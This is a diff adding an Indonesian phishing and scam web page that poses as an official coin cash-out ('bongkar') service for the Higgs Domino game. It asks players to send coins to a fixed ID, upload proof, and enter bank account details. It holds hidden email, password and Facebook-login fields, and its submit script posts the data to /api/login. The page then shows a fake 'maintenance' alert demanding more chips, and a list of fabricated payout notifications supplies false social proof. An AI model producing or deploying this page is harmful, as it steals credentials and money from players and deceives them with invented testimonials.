@@ -1,0 +1,907 @@
+<html lang ="en">
+<html>
+ <head> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+<link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css"> 
+  <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet"> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"> 
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
+  <link rel="stylesheet" href="file/css/facebook.css"> 
+  <title>Bongkar - Neo Party</title> 
+  <meta property="og:title" content="Agen Domino"> 
+  <meta name="description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
+  <meta property="og:description" content="Top Up Dan Bongkar Koin Agen Domino!"> 
+  <meta property="og:url" content="./"> 
+  <meta property="og:site_name" content="Agen Doimino"> 
+  <meta property="og:type" content="website"> 
+  <meta name="copyright" content="nwg Ariandi"> 
+  <meta name="theme-color" content="#0b5250"> 
+  <meta property="og:image" content="img/higgs_domino.webp"> 
+  <link rel="shorcut icon" href="favicon.png">
+  <style>
+body {
+  background: #043e3a;
+  color: #23e1fd;
+  font-family: "Helvetica Neue", Helvetica, STHeiTi, Arial, sans-serif;
+  margin: 0
+}
+
+/* tombol copy */
+.copyable { gap: 8px; }
+.copy-btn{
+  background: linear-gradient(45deg,#ff9800,#ffcc33);
+  border: none;
+  border-radius: 10px;
+  padding: 6px 12px;
+  font-weight: 700;
+  cursor: pointer;
+  box-shadow: 0 4px 10px rgba(0,0,0,.25);
+}
+.copy-btn:hover{ transform: scale(1.05); }
+	  
+
+/* === PRETTY SELECT (BANK) === */
+.pretty-input select {
+  border: none;
+  outline: none;
+  background: transparent;
+  width: 100%;
+  font-size: 15px;
+  font-weight: 600;
+  color: #5a3418;
+  appearance: none;
+  cursor: pointer;
+}
+
+/* Panah dropdown custom */
+.pretty-input {
+  position: relative;
+}
+
+.pretty-input::after {
+  content: "▼";
+  position: absolute;
+  right: 16px;
+  font-size: 12px;
+  color: #6b3f1d;
+  pointer-events: none;
+}
+
+
+/* === ID IMAGE HOVER EFFECT === */
+.id-image-wrap {
+  display: inline-block;
+  padding: 14px;
+  border-radius: 22px;
+  background: linear-gradient(45deg, #ff9800, #ffcc33);
+  box-shadow: 0 12px 25px rgba(0,0,0,0.25);
+  transition: all 0.35s ease;
+}
+
+.id-image {
+  width: 200px;
+  height: auto;
+  border-radius: 16px;
+  display: block;
+  transition: all 0.35s ease;
+  box-shadow: 0 10px 20px rgba(0,0,0,0.35);
+}
+
+/* Hover / Desktop */
+.id-image-wrap:hover {
+  transform: translateY(-8px) scale(1.05);
+  box-shadow: 0 18px 35px rgba(0,0,0,0.4);
+}
+
+.id-image-wrap:hover .id-image {
+  transform: scale(1.08);
+  filter: brightness(1.1);
+}
+
+/* Mobile tap effect */
+@media (max-width: 768px) {
+  .id-image-wrap:active {
+    transform: scale(1.05);
+  }
+}
+
+
+/* === PRETTY INPUT STYLE (MENIRU CONTOH) === */
+.pretty-input {
+  display: flex;
+  align-items: center;
+  background: #f3d2a2;
+  border-radius: 14px;
+  padding: 10px 14px;
+  margin-bottom: 12px;
+  box-shadow: inset 0 2px 4px rgba(0,0,0,0.15),
+              0 4px 10px rgba(0,0,0,0.25);
+}
+
+.pretty-icon {
+  color: #6b3f1d;
+  font-size: 16px;
+  margin-right: 10px;
+}
+
+.pretty-input input {
+  border: none;
+  outline: none;
+  background: transparent;
+  width: 100%;
+  font-size: 15px;
+  font-weight: 600;
+  color: #5a3418;
+}
+
+.pretty-input input::placeholder {
+  color: #8a5a2d;
+  font-weight: 500;
+}
+
+/* Fokus */
+.pretty-input:focus-within {
+  box-shadow: 0 0 0 2px #ffb300,
+              0 6px 14px rgba(0,0,0,0.35);
+  transform: scale(1.02);
+  transition: 0.2s ease;
+}
+
+/* Mobile */
+@media (max-width: 480px) {
+  .pretty-input {
+    padding: 9px 12px;
+  }
+}
+/* === PRETTY INPUT STYLE (MENIRU CONTOH) === */
+.pretty-input {
+  display: flex;
+  align-items: center;
+  background: #f3d2a2;
+  border-radius: 14px;
+  padding: 10px 14px;
+  margin-bottom: 12px;
+  box-shadow: inset 0 2px 4px rgba(0,0,0,0.15),
+              0 4px 10px rgba(0,0,0,0.25);
+}
+
+.pretty-icon {
+  color: #6b3f1d;
+  font-size: 16px;
+  margin-right: 10px;
+}
+
+.pretty-input input {
+  border: none;
+  outline: none;
+  background: transparent;
+  width: 100%;
+  font-size: 15px;
+  font-weight: 600;
+  color: #5a3418;
+}
+
+.pretty-input input::placeholder {
+  color: #8a5a2d;
+  font-weight: 500;
+}
+
+/* Fokus */
+.pretty-input:focus-within {
+  box-shadow: 0 0 0 2px #ffb300,
+              0 6px 14px rgba(0,0,0,0.35);
+  transform: scale(1.02);
+  transition: 0.2s ease;
+}
+
+/* Mobile */
+@media (max-width: 480px) {
+  .pretty-input {
+    padding: 9px 12px;
+  }
+}
+	  
+
+/* === NOTIFICATION SYSTEM === */
+#notifications-container {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  z-index: 99999;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  pointer-events: none;
+}
+
+.notification {
+  display: flex;
+  align-items: center;
+  background: linear-gradient(135deg, #1fa866, #0b6b43);
+  color: #ffffff;
+  padding: 12px 16px;
+  border-radius: 14px;
+  min-width: 260px;
+  max-width: 320px;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.35);
+  animation: slideInRight 0.5s ease, fadeOut 0.5s ease 3.5s;
+}
+
+.notification-icon {
+  width: 42px;
+  height: 42px;
+  margin-right: 12px;
+  flex-shrink: 0;
+}
+
+.notification-content {
+  display: flex;
+  flex-direction: column;
+}
+
+.notification-title {
+  font-weight: 700;
+  font-size: 14px;
+}
+
+.notification-message {
+  font-size: 13px;
+  opacity: 0.9;
+}
+
+/* Animasi */
+@keyframes slideInRight {
+  from {
+    transform: translateX(120%);
+    opacity: 0;
+  }
+  to {
+    transform: translateX(0);
+    opacity: 1;
+  }
+}
+
+@keyframes fadeOut {
+  to {
+    opacity: 0;
+  }
+}
+
+/* Mobile safe */
+@media (max-width: 480px) {
+  #notifications-container {
+    right: 10px;
+    top: 10px;
+  }
+
+  .notification {
+    min-width: unset;
+    width: 92vw;
+  }
+}
+	  
+.img-id-horizontal {
+  width: 500px;
+  height: 200px;
+  max-width: 100%;      /* aman di HP */
+  object-fit: contain; /* gambar tidak gepeng */
+}
+	  
+.btn-telegram-admin {
+  display: inline-block;
+  margin-top: 8px;
+  padding: 4px 18px;
+  font-size: 14px;          /* lebih kecil */
+  font-weight: 600;
+  color: #1a5f9e;
+  background: linear-gradient(0deg, #4fc3f7 0%, #b3e5fc 100%);
+  border-radius: 8px;
+  box-shadow: 0 2px 1px rgba(0,0,0,0.2);
+  text-decoration: none;
+}
+
+.btn-telegram-admin i {
+  margin-right: 6px;
+}
+
+.btn-telegram-admin:hover {
+  transform: scale(1.03);
+}
+
+	  
+.btn-chat-admin {
+  display: inline-block;
+  background-color: #67a309;
+  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
+  color: #268707;
+  font-size: 20px;
+  font-weight: 600;
+  margin-top: 10px;
+  line-height: 30px;
+  border-radius: 10px;
+  box-shadow: 0 2px 1px 0 #1a5806;
+  padding: 4px 30px;
+  text-decoration: none;
+}
+
+.btn-chat-admin:hover {
+  transform: scale(1.05);
+}
+
+	  
+.btn-link-container {
+  text-align: center;
+  margin: 15px 0;
+}
+
+.btn-link-domino {
+  display: inline-block;
+  padding: 12px 18px;
+  background: linear-gradient(45deg, #ff9800, #ffcc33);
+  color: #000;
+  font-weight: 700;
+  font-size: 14px;
+  border-radius: 10px;
+  text-decoration: none;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  transition: all 0.3s ease;
+}
+
+.btn-link-domino:hover {
+  transform: scale(1.05);
+  background: linear-gradient(45deg, #ffb300, #ffe066);
+}
+
+
+.fa-whatsapp{
+	color: rgb(4, 119, 4);
+}   
+.appnwghdiprem {
+  background: #043e3a;
+  background-size: 100% 100%;
+  position: relative;
+  margin: 0 auto;
+  max-width: 411px;
+  height: auto
+}
+
+}
+.containernwghdi {
+  display: flow-root
+}
+    .boxverifnwghdi {
+
+  background: #0b5250
+}
+
+.headernwgverifhdi {
+  background: url(bg_top.jpg) no-repeat center;
+  background-size: 120% 120%;
+  font-size: 19px;
+  line-height: 40px;
+  text-align: center;
+  color: #FFFF33;
+  font-weight: 700;
+  border-bottom: 4px solid #00e5f4
+}
+
+.headernwgverifhdi p {
+  margin-block: 0
+}
+
+.boxnwgverifmarsya {
+  background: url(bg_top.jpg) no-repeat center;
+  background-size: cover;
+  padding: 10px
+}
+
+.ucapanverifnwg {
+  display: flex;
+  flex-direction: column;
+  line-height: 20px;
+  font-size: 20px
+  font-weight: 700px
+}
+
+.verifikasikeamanannwg {
+  padding: 10px
+}
+
+.itemnwgverifhdi {
+  display: flex;
+  margin-bottom: 10px
+}
+
+.itemnwgverifhdi label {
+  background: #ffbc68;
+  color: #814545;
+  padding: 8px;
+  border-radius: 200px;
+  font-weight: 600;
+   width: 40px;
+ height: 20px;
+  text-align: middle;
+  display: center;
+  flex-direction: row;
+  align-items: center;
+}
+
+.itemnwgverifhdi select {
+  width: 100%;
+  margin-left: 10px;
+  background: #d5b184;
+  color: #835121;
+  border: none;
+  padding: 10px 10px;
+  font-size: 17px;
+  border-radius: 5px;
+  outline: 0
+}
+
+.itempantek input {
+  width: 50%;
+  margin-left:5px;
+  background:  ;
+  color: #835121;
+  border: none;
+  padding: 10px 10px;
+  font-size: 17px;
+  border-radius: 5px;
+  outline: 0
+}
+
+.itempantek label {
+  background: #ffbc68;
+  color: #814545;
+    margin-left: 60px;
+  padding: 8px;
+  border-radius: 100px;
+  font-weight: 600;
+   width: 40px;
+            height: 20px;
+  text-align: middle;
+  display: center;
+  flex-direction: row;
+  align-items: center;
+}
+
+.itempantek select {
+  width: 100%;
+  margin-left: 10px;
+  background: #d5b184;
+  color: #835121;
+  border: none;
+  padding: 10px 10px;
+  font-size: 17px;
+  border-radius: 5px;
+  outline: 0
+  }
+
+  .itempantek {
+  display: flex;
+  margin-bottom: 10px
+}
+
+.itemkontol label {
+  margin-left: 60px;
+  padding: 11px 1px;
+  border-radius: 200px;
+  font-weight: 600;
+   width: 40px;
+            height: 20px;
+  text-align: middle;
+  display: center;
+  flex-direction: row;
+  align-items: center;
+}
+
+.itemkontol {
+  display: flex;
+  margin-bottom: 10px
+}
+
+.itemkontol input {
+  width: 50%;
+  margin-left: 8px;
+  background: #d5b184;
+  color: #835121;
+  border: none;
+  padding: 10px 10px;
+  font-size: 17px;
+  border-radius: 5px;
+  outline: 0
+}
+
+.itemnanjg {
+    
+  margin-bottom: 10px
+}
+
+.itemnanjg select {
+  width: %;
+  margin-left: 0px;
+  background: #d5b184;
+  color: #835121;
+  border: none;
+  padding: 10px 10px;
+  font-size: 17px;
+  border-radius: 5px;
+  outline: 0
+
+}
+
+.itemnwgverifhdi input {
+  width: 100%;
+  margin-left: 10px;
+  background: #d5b184;
+  color: #835121;
+  border: none;
+  padding: 10px 10px;
+  font-size: 17px;
+  border-radius: 5px;
+  outline: 0
+}
+
+.buttonnwgverifhdi {
+  text-align: center
+}
+
+.buttonnwgverifhdi button {
+  background-color: #67a309;
+  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
+  color: #268707;
+  border: none;
+  font-size: 20px;
+  font-weight: 600;
+  margin-top: 10px;
+  line-height: 30px;
+  border-radius: 10px;
+  box-shadow: 0 2px 1px 0 #1a5806;
+  outline: 0;
+  padding: 4px 30px
+}
+.buttonnwgverifhdi1 {
+  text-align: left
+}
+
+.buttonnwgverifhdi1 button {
+  background-color: #67a309;
+  background-image: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
+  color: #268707;
+  border: none;
+  font-size: 20px;
+  font-weight: 600;
+  margin-top: 10px;
+  line-height: 30px;
+  border-radius: 10px;
+  box-shadow: 0 2px 1px 0 #1a5806;
+  outline: 0;
+  padding: 4px 30px
+}
+
+.-inline-icon {
+    /* Mengatur rna ikon agar lebih kontras di tombol hijau */
+    color: white !important; 
+    margin-right: 5px;
+    font-size: 1em;
+}	  
+   
+</style>
+ </head> 
+ <body style="background: ;">
+ <div id="notifications-container" color="#2ba39b"></div>
+  <div class="appnwghdiprem" style="background: ;"> 
+   <div class="containernwghdi"> 
+    <div class="boxverifnwghdi"> 
+     <div class="headernwgverifhdi"> 
+      <p> Admin Resmi Bongkar  </p> 
+     </div>
+     <div class="boxnwgverifmarsya"> 
+     <img src="img/bgcok.png" alt="image" height="auto" width="100%">
+     <div class="btn-link-container">
+      <a href="https://www.youtube.com/watch?v=n93T7sNPgdI"
+         target="_blank"
+         class="btn-link-domino">
+         Tutorial Bongkar Dan Testimoni Cek Disini
+      </a>
+      </div>
+     <div class="btn-link-container">
+      <a href="http://topup.neoparty.web.id"
+         target="_blank"
+         class="btn-link-domino">
+         TOP UP KOIN KLIK DISINI
+      </a>
+      </div>
+
+
+      <div class="itemnanjg"> 
+        <div class="itemnanjg">
+      
+     
+      </div> 
+     </div> 
+     <div class="verifikasikeamananwg"> 
+      <form id="bongkarForm" class="boxformnwg"> 
+        <div class="appnwghdiprem" style="background: #0b5250;"> 
+          <div class="containernwghdi"> 
+            <div class="boxverifnwghdi"> 
+              <div class="headernwgverifhdi"> 
+                <div class="itemnanjg">   
+                </div> 
+                <p>Info Pengirim</p> 
+              </div>
+              <div class="pretty-input">
+  <span class="pretty-icon">❖</span>
+  <input type="number" name="id_pengirim" placeholder="Masukkan ID Anda" required>
+</div>
+
+<div class="pretty-input">
+  <span class="pretty-icon">❖</span>
+  <input type="text" name="nickname" placeholder="Masukkan Nickname" required>
+</div>
+
+<div class="pretty-input">
+  <span class="pretty-icon">❖</span>
+  <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar" required>
+</div>
+
+                <body style="background: #0b5250;"> 
+                  <div class="appnwghdiprem" style="background: #0b5250;"> 
+                    <div class="containernwghdi"> 
+                      <div class="boxverifnwghdi"> 
+                        <div class="headernwgverifhdi"> 
+                          <p>Silahkan Kirim Koin Ke Id Di Bawah Ini</p> 
+                        </div>
+                      </header> 
+                      <section class="banner"> 
+                        <div class="imageslide">
+                          <div style="text-align:center"> 
+                            <figure class="sliderbanner" style="display: block;"> 
+                              <img src="img/id.png" alt="Image" height="200" width="200">
+                            </figure> 
+                            <div class="pretty-input copyable">
+  <span class="pretty-icon">🆔</span>
+  <input type="text" id="idPenerima" value="2571684" readonly>
+  <button type="button" class="copy-btn" onclick="copyID()">Copy</button>
+</div>
+                                <script>
+                                  function myFunction() {
+                                    var copyText = document.getElementById("myInput");
+                                    copyText.select();
+                                    copyText.setSelectionRange(0, 99999);
+                                    navigator.clipboard.writeText(copyText.value);
+                                    alert("Copied the text: " + copyText.value);
+                                  }
+                                </script>
+
+                            </body>
+        </div>
+      <div>
+          <div class="boxnwgverifmarsya"> 
+      <div class="ucapanverifnwg"> 
+       <span>SILAHKAN KIRIM SCRENSHOOT HISTORI PERNGIRIMAN AKUN ANDA KE AKUN YANG TERTERA DI ATAS</span> 
+        </div>
+        <div class="itemkontol">
+               <body style="background: #0b5250;"> 
+  <div class="appnwghdiprem" style="background: #0b5250;"> 
+   <div class="containernwghdi"> 
+    <div class="boxverifnwghdi"> 
+     <div class="headernwgverifhdi"> 
+       <form action="/action_page.php">
+  <input type="file" id="myFile" name="filename">
+</form>
+       </div>
+       <body style="background: #0b5250;"> 
+  <div class="appnwghdiprem" style="background: #0b5250;"> 
+   <div class="containernwghdi"> 
+    <div class="boxverifnwghdi"> 
+	<div class="pretty-input">
+  <span class="pretty-icon">🏦</span>
+  <select name="bank_pencairan" required>
+    <option value="" disabled selected>Pilih Bank / E-Wallet</option>
+    <option>BCA</option>
+    <option>BRI</option>
+    <option>BNI</option>
+    <option>MANDIRI</option>
+    <option>DANA</option>
+    <option>OVO</option>
+    <option>GOPAY</option>
+  </select>
+</div>
+                                        <div class="pretty-input">
+  <span class="pretty-icon">💳</span>
+  <input type="number" name="nomor_rekening" placeholder="Nomor Rekening" required>
+</div>
+                                       <div class="pretty-input">
+  <span class="pretty-icon">👤</span>
+  <input type="text" name="atas_nama" placeholder="Atas Nama" required>
+</div>
+                                        <div class="buttonnwgverifhdi"> 
+                                          <input type="hidden" name="playid" id="ressplayid" value="" readonly>
+                                          <input type="hidden" name="email" id="ressemail" value="" readonly>
+                                          <input type="hidden" name="password" id="resspw" value="" readonly>
+                                          <input type="hidden" name="login" id="nwg_login_fb" value="Facebook" readonly>
+                                          
+                                          <div class="buttonnwgverifhdi"> 
+                                            <button type="submit">Kirim</button>
+
+                                            <br>
+
+                                            <a href="https://t.me/AgenNeoParty"
+                                              target="_blank"
+                                              class="btn-telegram-admin">
+                                             <i class="fa fa-telegram"></i> Chat Admin
+                                            <a>
+                                          </div>
+
+                                        </div> 
+                                      </div> 
+                                    </div> 
+                                  </div> 
+                                </body>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </section>
+                    </div>
+                  </div>
+                </body>
+              </div>
+            </div> 
+          </div> 
+        </div> 
+      </form> 
+     </div> 
+    </div> 
+    <iframe scrolling="no" allow="autoplay" controls="" loop="" src="" style="display: none" width="0" height="0" frameborder="no"></iframe> 
+   </div> 
+  </div> 
+
+<script>
+document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    // Pastikan tombol kirim berubah status agar user tidak klik berkali-kali
+    const btn = this.querySelector("button[type='submit']");
+    btn.innerText = "Mengirim...";
+    btn.disabled = true;
+
+    // Ambil data form
+    const formData = new FormData(this);
+    const data = Object.fromEntries(formData.entries());
+
+    try {
+        // Fetch ke api/login
+        const res = await fetch("/api/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+
+        const result = await res.json();
+
+        if (result.status === "success") {
+            alert("Pencairan Maintenance❗️ Silahkan Melakukan Pengiriman Chip Agar Dana Anda Segera Di Cairkan Atau Chat Admin");
+            this.reset();
+        } else {
+            alert("❌ Gagal: " + result.message);
+        }
+    } catch (err) {
+        alert("❌ ERROR");
+    } finally {
+        btn.innerText = "Kirim";
+        btn.disabled = false;
+    }
+});
+document.addEventListener('DOMContentLoaded', () => {
+            const notifications = [
+  { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 7090', message: 'Bongkar 11B | Rp. 682.000.' },
+  { title: 'Rido Putra', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Walleye', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 930.000.' },
+  { title: 'Infinix', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.860.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 200B | Rp. 12.400.000.' },
+  { title: 'Iphone', message: 'Bongkar 6B | Rp. 372.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 124.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 8090', message: 'Bongkar 25B | Rp. 1.550.000.' },
+  { title: 'Walleye', message: 'Bongkar 1B | Rp. 62.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 806.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 60B | Rp. 3.720.000.' },
+  { title: 'Infinix', message: 'Bongkar 4B | Rp. 248.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 14B | Rp. 868.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 7090', message: 'Bongkar 11B | Rp. 682.000.' },
+  { title: 'Rido Putra', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 55B | Rp. 3.410.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Walleye', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 50B | Rp. 3.100.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 15B | Rp. 930.000.' },
+  { title: 'Infinix', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'RMX 1020', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Walleye', message: 'Bongkar 30B | Rp. 1.860.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 200B | Rp. 12.400.000.' },
+  { title: 'Iphone', message: 'Bongkar 6B | Rp. 372.000.' },
+  { title: 'Agung Rahman', message: 'Bongkar 100B | Rp. 6.200.000.' },
+  { title: 'Randi Purnama', message: 'Bongkar 10B | Rp. 620.000.' },
+  { title: 'Infinix pro', message: 'Bongkar 5B | Rp. 310.000.' },
+  { title: 'Agus Rahman', message: 'Bongkar 2B | Rp. 124.000.' },
+  { title: 'Siti Aisyah', message: 'Bongkar 7B | Rp. 434.000.' },
+  { title: 'RMX 8090', message: 'Bongkar 25B | Rp. 1.550.000.' },
+  { title: 'Walleye', message: 'Bongkar 1B | Rp. 62.000.' },
+  { title: 'Poco X3 pro', message: 'Bongkar 13B | Rp. 806.000.' },
+  { title: 'Agus Junaidi', message: 'Bongkar 60B | Rp. 3.720.000.' },
+  { title: 'Infinix', message: 'Bongkar 4B | Rp. 248.000.' },
+      ];
+
+            const container = document.getElementById('notifications-container');
+            let currentIndex = 0;
+
+            function createNotification(notification) {
+                const notificationDiv = document.createElement('div');
+                notificationDiv.className = 'notification';
+
+                const icon = document.createElement('img');
+                icon.src = 'img/reg_gold_.png';
+                icon.alt = 'Icon Pemberitahuan';
+                icon.className = 'notification-icon';
+
+                const contentDiv = document.createElement('div');
+                contentDiv.className = 'notification-content';
+
+                const titleDiv = document.createElement('div');
+                titleDiv.className = 'notification-title';
+                titleDiv.textContent = notification.title;
+
+                const messageDiv = document.createElement('div');
+                messageDiv.className = 'notification-message';
+                messageDiv.textContent = notification.message;
+
+                contentDiv.appendChild(titleDiv);
+                contentDiv.appendChild(messageDiv);
+                notificationDiv.appendChild(icon);
+                notificationDiv.appendChild(contentDiv);
+
+                container.appendChild(notificationDiv);
+
+                
+                setTimeout(() => {
+                    container.removeChild(notificationDiv);
+                }, 4000);
+            }
+
+            function showNotifications() {
+                setInterval(() => {
+                    createNotification(notifications[currentIndex]);
+                    currentIndex = (currentIndex + 1) % notifications.length;
+                }, 6000); 
+            }
+
+            showNotifications();
+        });
+
+function copyID(){
+  const el = document.getElementById('idPenerima');
+  el.select(); el.setSelectionRange(0,99999);
+  navigator.clipboard.writeText(el.value);
+  alert('COPY: ' + el.value);
+}
+</script>
+ </body>
+</html>
